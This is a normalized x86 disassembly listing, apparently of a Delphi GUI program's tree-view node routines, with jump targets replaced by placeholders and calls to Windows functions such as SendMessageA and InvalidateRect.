mov esi eax
cmp [ esi + 0x24 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_439008
test al al
je r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_438908
mov edx esi
mov si 0xffae
call sub_403370
mov eax esi
call sub_438908
mov edx esi
mov si 0xffaa
call sub_403370
jmp r-xdata
sub_438da0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test cl cl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438908
mov [ eax + 0x245 ] 0x1
xor eax eax
push ebp
push sub_438e83
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
test bl bl
je r-xdata
mov esi [ ebp - 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_438d08
test al al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_438d08
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_438910
test al al
jne r-xdata
test esi esi
je r-xdata
mov esi 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_438d5c
mov esi 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_438d5c
jmp r-xdata
xor ecx ecx
mov edx ebx
mov eax esi
call sub_438da0
mov eax esi
call sub_439250
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_438908
mov [ eax + 0x245 ] 0x0
retn
mov eax [ ebp - 0x4 ]
call sub_4388f4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
mov ecx esi
call sub_429940
sub_438eb0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_438ea8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor edx edx
mov eax esi
call sub_438e9c
xor edx edx
mov eax esi
call sub_438e90
jmp r-xdata
sub_438ee4
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x24 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4388f4
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_438edc
cmp bl al
je r-xdata
mov eax esi
call sub_438908
cmp [ eax + 0x274 ] 0x0
je r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_438908
mov eax [ eax + 0x278 ]
cmp [ eax + 0x8 ] 0x1
jle r-xdata
mov eax esi
call sub_438edc
test al al
je r-xdata
mov eax esi
call sub_4388f4
mov edx [ esi + 0x10 ]
call sub_429a90
jmp r-xdata
mov eax esi
call sub_438908
mov cl [ r-xdata ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0xe4 ]
mov eax esi
call sub_4388f4
xor edx edx
call sub_429a90
jmp r-xdata
sub_438f98
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_438f90
cmp bl al
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
xor edx edx
mov eax esi
call sub_438ae8
sub_438fc0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4388f4
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_438fb8
test al al
je r-xdata
mov eax esi
call sub_4388f4
mov edx [ esi + 0x10 ]
call sub_429a9c
jmp r-xdata
mov eax esi
call sub_4388f4
xor edx edx
call sub_429a9c
sub_439008
push ebx
push esi
add esp 0xffffffd8
mov esi eax
xor ebx ebx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov eax ebx
add esp 0x28
pop esi
pop ebx
retn
mov [ esp ] 0x40
mov eax [ esi + 0x10 ]
mov [ esp + 0x4 ] eax
mov eax esi
call sub_4388f4
mov edx esp
call sub_429ab4
test eax eax
je r-xdata
cmp [ esp + 0x20 ] 0x0
setg bl
sub_439048
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_439068
cmp bl al
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x2
mov eax esi
call sub_438ae8
sub_439070
push ebx
add esp 0xffffffd8
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
add esp 0x28
pop ebx
retn
mov [ esp ] 0x40
mov eax [ ebx + 0x10 ]
mov [ esp + 0x4 ] eax
xor eax eax
mov al dl
mov [ esp + 0x20 ] eax
mov eax ebx
call sub_4388f4
mov edx esp
call sub_429acc
sub_4390a8
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4388f4
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_439b78
mov edx [ ebx + 0x10 ]
call sub_429a14
mov edx eax
mov eax esi
call sub_439ff0
mov esi eax
sub_4390e4
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4388f4
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_439b78
mov edx [ ebx + 0x10 ]
call sub_4299fc
mov edx eax
mov eax esi
call sub_439ff0
mov esi eax
sub_439120
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4388f4
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_439b78
mov edx [ ebx + 0x10 ]
call sub_429a08
mov edx eax
mov eax esi
call sub_439ff0
mov esi eax
sub_43915c
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4388f4
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax ebx
call sub_439750
test al al
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_439b78
mov edx [ ebx + 0x10 ]
call sub_429a30
mov edx eax
mov eax esi
call sub_439ff0
mov esi eax
sub_4391a0
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4388f4
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax ebx
call sub_439750
test al al
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_439b78
mov edx [ ebx + 0x10 ]
call sub_429a3c
mov edx eax
mov eax esi
call sub_439ff0
mov esi eax
sub_4391f4
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4388f4
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_439b78
mov edx [ ebx + 0x10 ]
call sub_4299f0
mov edx eax
mov eax esi
call sub_439ff0
mov esi eax
sub_439230
push ebx
call sub_4391f4
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov ebx eax
mov eax ebx
call sub_4390e4
test eax eax
jne r-xdata
sub_439250
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_4388f4
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax ebx
call sub_4388f4
mov edx [ ebx + 0x10 ]
call sub_4299f0
test eax eax
jne r-xdata
mov esi [ ebx + 0x10 ]
jmp r-xdata
mov eax ebx
call sub_4388f4
mov edx [ ebx + 0x10 ]
call sub_4299fc
test eax eax
jne r-xdata
mov edx eax
mov eax [ ebx + 0x4 ]
call sub_439ff0
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
call sub_4388f4
mov edx esi
call sub_429a14
mov esi eax
mov eax ebx
call sub_4388f4
mov edx esi
call sub_4299fc
sub_4392c8
push ebx
push esi
mov esi eax
mov eax esi
call sub_439120
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_4390a8
mov ebx eax
mov eax ebx
mov ebx eax
mov eax ebx
call sub_439230
test eax eax
jne r-xdata
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4392f8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp ebx [ eax + 0xc ]
jne r-xdata
mov eax ebx
call sub_439728
test al al
je r-xdata
mov esi [ eax + 0x10 ]
jmp r-xdata
or esi 0xffffffff
mov eax ebx
test eax eax
je r-xdata
xor esi esi
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
inc esi
call sub_4392c8
test eax eax
jne r-xdata
sub_439330
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4393be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_4391f4
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
test esi esi
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4393c5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c1c
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408c7c
mov eax [ ebp - 0x4 ]
call sub_4387b4
mov edx ebx
mov eax edi
call sub_4391e4
mov ebx eax
dec esi
sub_4393d0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or esi 0xffffffff
mov eax ebx
call sub_4391f4
test eax eax
je r-xdata
test eax eax
jne r-xdata
inc esi
cmp edi eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
or esi 0xffffffff
mov edx eax
mov eax ebx
call sub_4391e4
test eax eax
jne r-xdata
sub_439404
push ebx
xor ebx ebx
call sub_4391f4
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
inc ebx
mov edx eax
call sub_4391e4
test eax eax
jne r-xdata
sub_439420
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x5c ] ebx
mov esi ecx
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_43958c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x4 ]
call sub_43a40c
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
mov [ ebp - 0x2e ] 0x4
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0xa ] eax
mov eax ebx
call sub_4388f4
lea edx [ ebp - 0x2e ]
call sub_429acc
mov esi [ ebx + 0x4 ]
lea ecx [ ebp - 0x58 ]
mov edx ebx
mov eax esi
call sub_439e54
lea eax [ ebp - 0x58 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_439e78
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_4390a8
mov edx 0x1
call sub_438cd8
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_439404
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x5c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
mov eax ebx
call sub_4390a8
xor edx edx
call sub_438eb0
mov eax ebx
call sub_4390a8
xor edx edx
call sub_439070
mov eax ebx
call sub_439008
mov [ ebp - 0x5 ] al
mov eax ebx
call sub_438edc
mov [ ebp - 0x6 ] al
mov eax ebx
call sub_4390a8
test eax eax
je r-xdata
mov eax ebx
call sub_4388f4
mov edx [ ebx + 0x10 ]
call sub_429910
mov [ ebx + 0x10 ] edi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl [ ebp - 0x5 ]
mov eax ebx
call sub_439070
mov dl [ ebp - 0x6 ]
mov eax ebx
call sub_438ee4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439593
lea eax [ ebp - 0x5c ]
call sub_403eec
retn
push edi
push 0x0
mov edx esi
mov eax ebx
call sub_439330
xor ecx ecx
mov edx ebx
call sub_439420
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_43959c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_438908
mov edx [ eax + 0x2b8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x2bc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_438908
mov edx [ eax + 0x2b0 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x2b4 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x4 ]
call sub_438908
xor edx edx
mov [ eax + 0x2b8 ] edx
mov [ eax + 0x2bc ] edx
mov eax [ ebp - 0x4 ]
call sub_438908
xor edx edx
mov [ eax + 0x2b0 ] edx
mov [ eax + 0x2b4 ] edx
xor edx edx
push ebp
push sub_43971a
push [ fs : edx ]
mov [ fs : edx ] esp
test edi edi
je r-xdata
mov bl 0x1
test edi edi
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_438910
test al al
jne r-xdata
mov esi edi
mov al [ ebp - 0x5 ]
add al 0xfe
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_438908
mov edx [ ebp - 0x10 ]
mov [ eax + 0x2b8 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x2bc ] edx
mov eax [ ebp - 0x4 ]
call sub_438908
mov edx [ ebp - 0x18 ]
mov [ eax + 0x2b0 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x2b4 ] edx
retn
test esi esi
je r-xdata
jmp [ eax * 4 + jump_table_43966b ]
mov eax edi
call sub_4390a8
mov esi eax
jmp r-xdata
xor eax eax
mov eax [ esi + 0x10 ]
jmp r-xdata
mov bl 0x1
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov eax edi
call sub_439120
mov edi eax
test edi edi
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_4390a8
mov esi eax
test esi esi
je r-xdata
push eax
push ebx
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_439420
cmp edi [ ebp - 0x4 ]
je r-xdata
mov bl 0x2
xor ebx ebx
jmp r-xdata
mov dl 0x1
mov eax esi
call sub_439070
mov dl 0x1
mov eax esi
call sub_438eb0
sub_439728
push ebx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4390a8
test eax eax
jne r-xdata
mov eax ebx
call sub_439120
test eax eax
je r-xdata
mov al 0x1
pop ebx
retn
sub_439750
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0xffffffff
mov eax ebx
call sub_4388f4
lea ecx [ esp + 0x4 ]
mov edx [ ebx + 0x10 ]
call sub_42995c
test eax eax
jne r-xdata
add esp 0x10
pop ebx
retn
mov al 0x1
sub_439780
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b80
cmp [ edi + 0x24 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax edi
call sub_4388f4
mov ecx esi
mov edx [ edi + 0x10 ]
call sub_42995c
sub_4397c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x4 ]
call sub_43a40c
test esi esi
jne r-xdata
mov [ ebp - 0x9 ] esi
mov eax sub_438748
mov [ ebp - 0x9 ] eax
jmp r-xdata
mov eax ebx
call sub_4391f4
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0xd ] eax
mov [ ebp - 0x5 ] edi
mov eax ebx
call sub_4388f4
lea edx [ ebp - 0xd ]
xor ecx ecx
call sub_429b28
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_439008
test al al
je r-xdata
mov eax ebx
call sub_4390e4
mov ebx eax
test ebx ebx
jne r-xdata
push 0x1
mov ecx edi
mov edx esi
mov eax ebx
call sub_4397c8
sub_439870
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_43a40c
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_418b70
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_438950
mov edx [ esi + 0xc ]
mov eax ebx
call sub_4389e4
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_438b84
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_438bdc
mov edx [ esi + 0x20 ]
mov eax ebx
call sub_438c84
mov edx [ esi + 0x1c ]
mov eax ebx
call sub_438c34
mov eax esi
call sub_439068
mov edx eax
mov eax ebx
call sub_439048
mov eax esi
call sub_438fb8
mov edx eax
mov eax ebx
call sub_438fc0
mov eax esi
call sub_438f90
mov edx eax
mov eax ebx
call sub_438f98
mov eax esi
call sub_439008
mov edx eax
mov eax ebx
call sub_439070
pop esi
pop ebx
retn
sub_439924
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4042f8
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
cmp eax [ esi + 0xc ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_43994c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_439a2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x4 ]
call sub_43a40c
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41acf0
mov edx edi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41acf0
lea eax [ ebp - 0x10 ]
lea edx [ edi + 0x18 ]
call sub_404150
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_438950
mov edx [ edi ]
mov eax ebx
call sub_438b84
mov edx [ edi + 0x4 ]
mov eax ebx
call sub_438bdc
mov edx [ edi + 0x8 ]
mov eax ebx
call sub_438c84
mov edx [ edi + 0xc ]
mov eax ebx
call sub_438c34
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4389e4
mov eax [ edi + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439a33
lea eax [ ebp - 0x10 ]
call sub_403eec
retn
inc eax
mov [ ebp - 0xc ] eax
xor ecx ecx
mov edx ebx
mov eax [ ebx + 0x4 ]
call sub_439c10
mov esi eax
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43994c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
mov si 0xffac
call sub_403370
dec [ ebp - 0xc ]
jne r-xdata
sub_439a3c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi ecx
mov [ esp ] edx
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_4041ac
cmp eax 0xff
jle r-xdata
add eax 0x118
sub eax 0xff
mov [ esp + 0x4 ] eax
lea eax [ esi + 0x18 ]
mov edx [ ebx + 0x8 ]
mov ecx 0xff
call sub_404188
mov eax [ ebx + 0x14 ]
mov [ esi ] eax
mov eax [ ebx + 0x18 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x20 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0x10 ] eax
mov eax ebx
call sub_439404
mov edi eax
mov [ esi + 0x14 ] edi
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax [ esp ]
call sub_41ad28
mov edx esi
mov ecx [ esp + 0x4 ]
mov eax [ esp ]
call sub_41ad28
dec edi
test edi edi
jl r-xdata
mov eax 0xff
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx ebp
mov eax ebx
call sub_439330
mov ecx esi
mov edx [ esp ]
call sub_439a3c
inc ebp
dec edi
jne r-xdata
sub_439aec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_439b28
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_439b8c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b44
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_439b54
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_454120
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_439b78
call sub_429980
pop ebx
retn
sub_439b8c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_454120
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_439c02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43a40c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_454120
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a020
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439c09
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_453e1c
call sub_429928
retn
mov eax [ ebp - 0x4 ]
call sub_43a06c
sub_439c30
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_439dcc
push [ fs : eax ]
mov [ fs : eax ] esp
test edx edx
jne r-xdata
mov [ ebp - 0x8 ] edx
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4389e4
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_438950
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_439e54
lea eax [ ebp - 0x38 ]
push eax
mov al [ ebp - 0xd ]
push eax
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_439e78
mov esi eax
test esi esi
jne r-xdata
mov al [ ebp + 0x8 ]
sub al 0x2
jb r-xdata
xor eax eax
push ebp
push sub_439d9f
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor edi edi
xor eax eax
mov al [ ebp + 0x8 ]
mov al [ eax + rw-data ]
mov [ ebp - 0xd ] al
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
mov eax [ ebp - 0x4 ]
call sub_4390a8
mov edi eax
test edi edi
je r-xdata
sub al 0x2
jb r-xdata
mov edx edi
mov eax ebx
call sub_439e34
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_439728
test al al
je r-xdata
mov esi [ edi + 0x10 ]
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov esi [ edi + 0x10 ]
jmp r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0x8 ]
mov si 0xffac
call sub_403370
push 0x0
push 0x1
push 0xb
mov eax ebx
call sub_439b78
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_4390a8
mov edi eax
test edi edi
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439dd3
lea eax [ ebp - 0x3c ]
call sub_403eec
retn
mov eax [ ebp - 0x4 ]
call sub_439120
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ edi + 0x10 ]
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_439de0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x1
jge r-xdata
add esp 0x10
pop esi
pop ebx
retn
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_439750
test al al
je r-xdata
mov ecx esp
xor edx edx
mov eax ebx
call sub_439780
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
call sub_453e1c
push eax
call InvalidateRect
mov eax ebx
call sub_4390a8
mov ebx eax
sub_439e34
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_439070
mov edx ebx
mov eax esi
call sub_439de0
sub_439e78
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_43a40c
mov [ ebp - 0x34 ] esi
mov al [ ebp + 0x8 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x30 ] 0xffff0001
jmp r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
mov esi eax
lea edi [ ebp - 0x2c ]
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x330 ]
xor edx edx
call sub_430e28
mov eax ebx
call sub_439b78
lea edx [ ebp - 0x34 ]
call sub_4298f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x30 ] 0xffff0002
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x30 ] edi
jmp r-xdata
sub_439f08
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_439fdd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c1c
mov eax [ ebp - 0x8 ]
call sub_4387b4
mov eax esi
call sub_439eec
mov ebx eax
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
sub eax [ ebp - 0x4 ]
cdq
xor eax edx
sub eax edx
dec eax
jg r-xdata
test edi edi
je r-xdata
lea eax [ esi + 0xc ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
cmp edx [ ebp - 0x4 ]
jle r-xdata
mov ebx [ eax ]
jmp r-xdata
mov [ esi + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439fe4
lea eax [ ebp - 0xc ]
